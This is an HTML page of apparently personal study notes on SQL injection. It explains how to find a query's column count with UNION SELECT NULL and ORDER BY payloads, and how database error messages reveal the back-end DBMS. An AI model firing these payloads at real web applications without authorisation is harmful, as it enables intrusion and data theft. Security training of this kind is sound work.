<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. know numbers of colums</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>1. know numbers of colums</h1><br/><strong><h2>Know </h2></strong><strong><h2>numbers of columns</h2></strong><br />We can use SELECT statements without an associated FROM that simply returns an interpreted form of whatever we supply.<br />• <strong>NULL method</strong><br />  Because NULL can be converted to any data type, we can inject queries with a payload with different numbers of NULL columns until then the query is executed.<br />   ◇ payload for 1 column:<span style="color:#f6ff00;"> ‘ </span><span style="color:#ffa500;">UNION SELECT NULL</span><span style="color:#f6ff00;">;-- -</span><br />   ◇ payload for 2 columns:<span style="color:#f6ff00;"> ‘ </span><span style="color:#ffa500;">UNION SELECT NULL, NULL</span><span style="color:#f6ff00;">;-- -</span><br />   ◇ payload for 3 columns:<span style="color:#f6ff00;"> ‘ </span><span style="color:#ffa500;">UNION SELECT NULL, NULL, NULL</span><span style="color:#f6ff00;">;-- -</span><br />   ◇ payload for 4 columns:<span style="color:#f6ff00;"> ‘ </span><span style="color:#ffa500;">UNION SELECT NULL, NULL, NULL, NULL</span><span style="color:#f6ff00;">;-- -</span><br />   ◇ payload for n columns: ...<br />  <span style="text-decoration:underline;">If we get an error is because we have not inserted the correct number of columns</span>. When the query is executed we have determined the numbers of columns :)<br />  In a normal query in the database it will look like this(4 column)<br />    <a href=""><img src="images/1686-1.png" alt="images/1686-1.png" /></a><br />  <span style="color:#ff0000;text-decoration:underline;">Error:</span> If the number of columns are incorrect the Web Application will give us an error, from it we can understand which type of Database is underlying.<br />   ◇ MySQL error:<br />       <a href=""><img src="images/1686-2.png" alt="images/1686-2.png" /></a><br />       <div class="codebox"><pre>The used SELECT statements have a different number of columns</pre></div><br />   ◇ MS SQL error:<br />        <a href=""><img src="images/1686-3.png" alt="images/1686-3.png" /></a><br />        <div class="codebox"><pre>All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists</pre></div><br />   ◇ PostgreSQL error:<br />        <a href=""><img src="images/1686-4.png" alt="images/1686-4.png" /></a><br />        <div class="codebox"><pre>ERROR: each UNION query must have the same number of columns</pre></div><br />   ◇ Oracle error:<br />        <a href=""><img src="images/1686-5.png" alt="images/1686-5.png" /></a><br />        <div class="codebox"><pre>ORA-01789: query block has incorrect number of result columns</pre></div><br /> <br />• <strong>ORDER BY method</strong><br />  ORDER BY is used to sort the data in either ascending or descending according to one or more columns. By default ORDER BY sorts the data in ascending order. If we know the names of the columns we can use them but usually we do not know them and so we use the numbers.<br />   ◇ payload for 1 column:<span style="color:#f6ff00;"> &#39; </span><span style="color:#ffa500;">ORDER BY 1</span><span style="color:#f6ff00;">;#</span><br />   ◇ payload for 2 columns:<span style="color:#f6ff00;"> &#39; </span><span style="color:#ffa500;">ORDER BY 2</span><span style="color:#f6ff00;">;#</span><br />   ◇ payload for 3 columns:<span style="color:#f6ff00;"> &#39; </span><span style="color:#ffa500;">ORDER BY 3</span><span style="color:#f6ff00;">;#</span><br />       <a href=""><img src="images/1686-6.png" alt="images/1686-6.png" /></a>       <br />   ◇ payload for n columns: ...<br />   When the query is NOT anymore executed means we have exceeded the number of columns in the target query<br />            <a href=""><img src="images/1686-7.png" alt="images/1686-7.png" /></a><br />            <a href=""><img src="images/1686-8.png" alt="images/1686-8.png" /></a></div>
</body>
</html>
